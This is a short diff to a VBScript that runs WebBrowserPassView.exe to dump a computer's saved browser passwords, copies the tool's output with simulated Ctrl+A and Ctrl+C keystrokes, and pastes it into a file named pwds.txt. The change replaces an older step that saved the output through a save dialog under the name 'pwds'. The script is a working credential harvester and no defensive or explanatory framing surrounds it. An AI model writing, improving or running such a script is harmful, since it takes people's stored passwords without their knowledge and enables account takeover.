@@ -3,9 +3,8 @@ x.run "WebBrowserPassView.exe"
 wscript.sleep 4000
 x.sendkeys "^(a)"
 x.sendkeys "^(c)"
-wscript.sleep 500
+x.run "pwds.txt"
+wscript.sleep 1000
+x.sendkeys "^(v)"
 x.sendkeys "^(s)"
-wscript.sleep 500
-x.sendkeys "pwds"
-x.sendkeys "{enter}"
-wscript.sleep 400
+
